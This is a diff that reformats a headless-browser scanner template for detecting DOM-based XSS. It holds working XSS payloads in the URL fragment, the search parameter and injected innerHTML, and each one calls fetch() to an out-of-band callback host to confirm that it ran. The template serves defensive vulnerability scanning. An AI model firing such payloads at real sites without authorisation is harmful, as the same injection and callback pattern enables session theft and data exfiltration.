@@ -1,77 +1,116 @@
-headless:
-- extractors:
-  - group: 0
-    part: interactsh_request
-    regex:
-    - /(fragment|search|innerhtml|docwrite|location)-[a-z0-9]+
-    type: regex
-  matchers:
-  - part: interactsh_protocol
-    type: word
-    words:
-    - http
-  - part: interactsh_request
-    type: word
-    words:
-    - '{{xss_id}}'
-  matchers-condition: and
-  steps:
-  - action: navigate
-    args:
-      url: '{{BaseURL}}'
-  - action: waitload
-  - action: navigate
-    args:
-      url: '{{BaseURL}}#<img src=x onerror=fetch(''{{callback}}/fragment-{{xss_id}}'')>'
-  - action: waitload
-  - action: navigate
-    args:
-      url: '{{BaseURL}}?search=<script>fetch(''{{callback}}/search-{{xss_id}}'')</script>'
-  - action: waitload
-  - action: script
-    args:
-      code: "// Find all elements that use innerHTML\nvar elements = document.querySelectorAll('[id],\
-        \ [class]');\nfor(var i=0; i<elements.length && i<10; i++) {\n  try {\n  \
-        \  var original = elements[i].innerHTML;\n    elements[i].innerHTML = \"<img\
-        \ src=x onerror=\\\"fetch('{{callback}}/innerhtml-{{xss_id}}')\\\">\";\n \
-        \   // Restore to not break the page\n    setTimeout(() => { elements[i].innerHTML\
-        \ = original; }, 100);\n  } catch(e) {}\n}\n"
-  - action: sleep
-    args:
-      duration: 2
-  - action: script
-    args:
-      code: "// Check for vulnerable patterns\nvar vulns = [];\n\n// Check for eval\
-        \ usage\nif(window.eval.toString().indexOf('[native code]') === -1) {\n  vulns.push('eval-overridden');\n\
-        }\n\n// Check for document.write\nvar scripts = document.getElementsByTagName('script');\n\
-        for(var i=0; i<scripts.length; i++) {\n  if(scripts[i].innerHTML.includes('document.write'))\
-        \ {\n    vulns.push('document-write-found');\n    fetch('{{callback}}/docwrite-{{xss_id}}');\n\
-        \  }\n}\n\n// Check for location manipulation\nif(location.href.includes('<')\
-        \ || location.hash.includes('<')) {\n  vulns.push('location-injectable');\n\
-        \  fetch('{{callback}}/location-{{xss_id}}');\n}\n\nwindow.vulns = vulns;\n"
-  - action: extract
-    args:
-      name: vulnerabilities
-      script: window.vulns || []
 id: dom-xss-detection
+
 info:
+  name: DOM XSS Detection with Real Browser Execution
   author: geeknik
+  severity: high
+  description: |
+    Detects DOM-based XSS vulnerabilities by executing JavaScript in a real
+    browser context and monitoring for successful payload execution.
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+    - https://portswigger.net/web-security/cross-site-scripting/dom-based
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
     cvss-score: 6.1
     cwe-id: CWE-79
-  description: 'Detects DOM-based XSS vulnerabilities by executing JavaScript in a
-    real
-
-    browser context and monitoring for successful payload execution.
-
-    '
-  name: DOM XSS Detection with Real Browser Execution
-  reference:
-  - https://owasp.org/www-community/attacks/xss/
-  - https://portswigger.net/web-security/cross-site-scripting/dom-based
-  severity: high
   tags: xss,dom,headless,injection
+
 variables:
-  callback: '{{interactsh-url}}'
-  xss_id: '{{randstr}}'
+  xss_id: "{{randstr}}"
+  callback: "{{interactsh-url}}"
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitload
+
+      # Test 1: URL fragment XSS
+      - action: navigate
+        args:
+          url: "{{BaseURL}}#<img src=x onerror=fetch('{{callback}}/fragment-{{xss_id}}')>"
+
+      - action: waitload
+
+      # Test 2: Search parameter XSS
+      - action: navigate
+        args:
+          url: "{{BaseURL}}?search=<script>fetch('{{callback}}/search-{{xss_id}}')</script>"
+
+      - action: waitload
+
+      # Test 3: DOM manipulation via innerHTML
+      - action: script
+        args:
+          code: |
+            // Find all elements that use innerHTML
+            var elements = document.querySelectorAll('[id], [class]');
+            for(var i=0; i<elements.length && i<10; i++) {
+              try {
+                var original = elements[i].innerHTML;
+                elements[i].innerHTML = "<img src=x onerror=\"fetch('{{callback}}/innerhtml-{{xss_id}}')\">";
+                // Restore to not break the page
+                setTimeout(() => { elements[i].innerHTML = original; }, 100);
+              } catch(e) {}
+            }
+
+      - action: sleep
+        args:
+          duration: 2
+
+      # Test 4: Check for unsafe DOM sinks
+      - action: script
+        args:
+          code: |
+            // Check for vulnerable patterns
+            var vulns = [];
+
+            // Check for eval usage
+            if(window.eval.toString().indexOf('[native code]') === -1) {
+              vulns.push('eval-overridden');
+            }
+
+            // Check for document.write
+            var scripts = document.getElementsByTagName('script');
+            for(var i=0; i<scripts.length; i++) {
+              if(scripts[i].innerHTML.includes('document.write')) {
+                vulns.push('document-write-found');
+                fetch('{{callback}}/docwrite-{{xss_id}}');
+              }
+            }
+
+            // Check for location manipulation
+            if(location.href.includes('<') || location.hash.includes('<')) {
+              vulns.push('location-injectable');
+              fetch('{{callback}}/location-{{xss_id}}');
+            }
+
+            window.vulns = vulns;
+
+      - action: extract
+        args:
+          name: vulnerabilities
+          script: "window.vulns || []"
+
+    matchers-condition: and
+    matchers:
+      # DOM XSS triggers fetch() callbacks - only HTTP interactions are relevant,
+      # not DNS (DNS would indicate network resolution, not JS execution).
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+      - type: word
+        part: interactsh_request
+        words:
+          - "{{xss_id}}"
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '/(fragment|search|innerhtml|docwrite|location)-[a-z0-9]+'
+        group: 0
